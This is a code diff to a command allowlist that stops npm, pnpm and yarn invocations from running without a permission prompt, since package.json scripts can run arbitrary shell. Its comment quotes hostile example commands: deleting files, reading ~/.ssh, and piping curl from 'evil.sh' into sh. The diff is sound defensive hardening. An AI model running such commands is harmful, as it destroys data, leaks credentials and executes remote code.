@@ -55,11 +55,22 @@ const SILENT_ALLOWLIST = [
       a[0] === 'describe' || a[0] === 'tag' && (a.length === 1 || a[1] === '-l' || a[1] === '--list')
     ) && !a.includes('--exec') && !a.some(x => x.startsWith('--upload-pack'))
   },
-  // npm/node/test runners — read-only invocations
-  { match: (h, a) => h === 'npm' && (a[0] === 'test' || a[0] === 'run' || a[0] === 'list' || a[0] === 'ls' || a[0] === 'view') },
+  // Phase 2D follow-up #2 (Codex 🟠, 2026-05-04): npm/pnpm/yarn
+  // test/run/list/view/ls/why are NO LONGER silent. package.json
+  // scripts are arbitrary shell — an attacker (or careless dev)
+  // can put `rm -rf x` / `cat ~/.ssh/...` / `curl evil.sh | sh`
+  // in `scripts.test`. Even read-only-looking commands like
+  // `npm view <pkg>` fetch over network, which is its own
+  // sensitivity question. So: every package-manager invocation
+  // prompts (default-deny path falls through). Removed:
+  //   - npm test|run|list|ls|view
+  //   - pnpm test|run|list|ls
+  //   - yarn test|run|list|why
+  //
+  // Only true read-only metadata + no-script invocations remain
+  // (and only the version probe — anything else loads npm's own
+  // arbitrary script execution paths).
   { match: (h, a) => h === 'node' && (a.includes('--version') || a[0] === '-v' || a[0] === '--version') },
-  { match: (h, a) => h === 'pnpm' && (a[0] === 'test' || a[0] === 'run' || a[0] === 'list' || a[0] === 'ls') },
-  { match: (h, a) => h === 'yarn' && (a[0] === 'test' || a[0] === 'run' || a[0] === 'list' || a[0] === 'why') },
   // language toolchain version checks
   { match: (h, a) => /^(python3?|ruby|perl|go|cargo|rustc)$/.test(h) && (a.includes('--version') || a[0] === '-v' || a[0] === '--version') },
   // which / type / command — lookup utilities
